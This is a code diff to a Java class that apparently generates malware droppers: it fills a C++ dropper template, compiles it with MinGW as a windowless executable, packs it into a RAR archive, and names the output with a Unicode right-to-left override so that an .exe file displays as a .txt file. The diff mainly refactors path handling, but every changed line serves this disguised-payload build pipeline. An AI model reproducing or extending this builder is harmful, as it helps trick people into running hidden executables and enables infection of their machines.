@@ -24,7 +24,7 @@ public class EXEGenerator {
         Scanner scanner;
         SettingsSingleton ss = SettingsSingleton.getInstance();
         try {
-            scanner = new Scanner(new File(ss.getWORKING_DIRECTORY()+"/dropper_files/dropper-original.cpp"));
+            scanner = new Scanner(new File(Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","dropper-original.cpp").toString()));
         } catch (IOException e) {
             log.logp(Level.SEVERE, "EXEGenerator", "EXE_gen", e.toString());
             throw new RuntimeException(e);
@@ -43,7 +43,7 @@ public class EXEGenerator {
             text.append(tmp).append("\n");
         }
         scanner.close();
-        Path DropperGeneratedPath = Paths.get("dropper_files/dropper_outs/dropper" + filename/*.split("\u202e")[0] */+ ".cpp");
+        Path DropperGeneratedPath = Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","dropper_outs","dropper" + filename/*.split("\u202e")[0] */+ ".cpp");
         try {
             byte[] bt = String.valueOf(text).getBytes();
             Files.write(DropperGeneratedPath, bt, StandardOpenOption.CREATE);
@@ -75,16 +75,15 @@ Paths.get("files").toAbsolutePath().normalize() + "/" + filename +"_\u202excod.e
             String command_rename = "mv "+ArchiveCopiedPath.toAbsolutePath().normalize()
                     +"/archive-original.exe "+ ArchiveCopiedPath.toAbsolutePath().normalize()+ "/" + filename +"\u202etxt.exe";
             //Path DropiExePath = Paths.get("dropper_files/tmp/dropi.exe");*/
-            Path TmpPath = Paths.get("dropper_files/tmp");
+            //Path TmpPath = Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","tmp");
             String commandGen = ss.getMINGW_COMMAND()+" " +
-                    DropperGeneratedPath.toAbsolutePath().normalize() + " -o " + TmpPath.toAbsolutePath().normalize() +
-                    "/dropi.exe -mwindows -static-libstdc++ -static-libgcc";
-            String commandCpOriginals = ss.getCP_COMMAND()+" "+Paths.get("dropper_files/archive-original.exe").toAbsolutePath().normalize()
-                    +" "+TmpPath.toAbsolutePath().normalize();
-            String commandUpdate = ss.getRAR_COMMAND()+" u -ep "+TmpPath.toAbsolutePath().normalize()+"/archive-original.exe "
-                    +TmpPath.toAbsolutePath().normalize()+"/dropi.exe "+Paths.get("dropper_files").toAbsolutePath().normalize()+"/file.txt";
-            String commandCpOuts = ss.getCP_COMMAND()+" "+TmpPath.toAbsolutePath().normalize()+"/archive-original.exe "+
-                    Paths.get("files").toAbsolutePath().normalize()+"/"+filename+"\u202etxt.exe";
+                    DropperGeneratedPath + " -o " + Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","tmp","dropi.exe")+" -mwindows -static-libstdc++ -static-libgcc";
+            String commandCpOriginals = ss.getCP_COMMAND()+" "+Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files/archive-original.exe")
+                    +" "+Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","tmp");
+            String commandUpdate = ss.getRAR_COMMAND()+" u -ep "+Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","tmp","archive-original.exe")
+                    +" " +Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","tmp","dropi.exe")+" "+Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","file.txt");
+            String commandCpOuts = ss.getCP_COMMAND()+" "+Paths.get(ss.getWORKING_DIRECTORY(),"dropper_files","tmp","archive-original.exe")+" "+
+                    Paths.get(ss.getWORKING_DIRECTORY(),"files",filename+"\u202etxt.exe");
 
 
             readData(Runtime.getRuntime().exec(commandGen));
